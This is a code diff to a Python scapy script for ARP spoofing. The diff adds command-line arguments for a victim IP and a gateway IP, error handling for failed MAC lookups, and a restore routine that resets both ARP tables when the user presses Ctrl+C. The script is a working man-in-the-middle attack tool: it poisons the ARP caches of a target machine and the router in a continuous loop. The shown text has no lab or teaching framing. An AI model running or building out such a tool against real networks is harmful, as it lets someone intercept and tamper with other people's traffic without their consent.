@@ -1,6 +1,7 @@
 from scapy.all import *
 import time
 import sys
+import argparse
 
 def get_mac(ip):
 
@@ -33,6 +34,14 @@ def spoof(target_ip, spoof_ip, target_mac):
     # send the packet (verbose=False hides the output)
     sendp(packet, verbose=False)  # Use sendp for layer 2 packets
 
+def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    # Restore victim's ARP table
+    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
+
+    # Restore gateway's ARP table
+    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)
+
+
 # USAGE EXAMPLE in a loop:
 # target_ip = "192.168.1.5" (Victim)
 # gateway_ip = "192.168.1.1" (Router)
@@ -49,17 +58,30 @@ def spoof(target_ip, spoof_ip, target_mac):
 #     time.sleep(2)
 
 if __name__ == "__main__":
-    victim_ip = "<VICTIM_IP>"
-    gateway_ip = "<GATEWAY_IP>"
+    parser = argparse.ArgumentParser(description="ARP Spoofing Tool. Victim and Gateway IPs required.")
+    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
+    parser.add_argument("--gateway", required=True, help="IP address of the gateway")
+    args = parser.parse_args()
+
+    victim_ip = args.victim
+    gateway_ip = args.gateway
 
     victim_mac = get_mac(victim_ip)
     gateway_mac = get_mac(gateway_ip)
 
-    print("[+] Victim MAC:", victim_mac)
-    print("[+] Gateway MAC:", gateway_mac)
-    print("[+] Starting ARP spoofing... Press CTRL+C to stop")
+    if not victim_mac or not gateway_mac:
+        print("[-] Could not find MAC addresses. Exiting.")
+        sys.exit(1)
 
-    while True:
-        spoof(victim_ip, gateway_ip, victim_mac)
-        spoof(gateway_ip, victim_ip, gateway_mac)
-        time.sleep(2)
+    print("[+] Victim IP:", victim_ip, "MAC:", victim_mac)
+    print("[+] Gateway IP:", gateway_ip, "MAC:", gateway_mac)
+    print("[+] Starting ARP Spoofing... Press CTRL+C to stop")
+
+    try:
+        while True:
+            spoof(victim_ip, gateway_ip, victim_mac)
+            spoof(gateway_ip, victim_ip, gateway_mac)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[+] Stopping ARP Spoofing. Restoring network...")
+        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
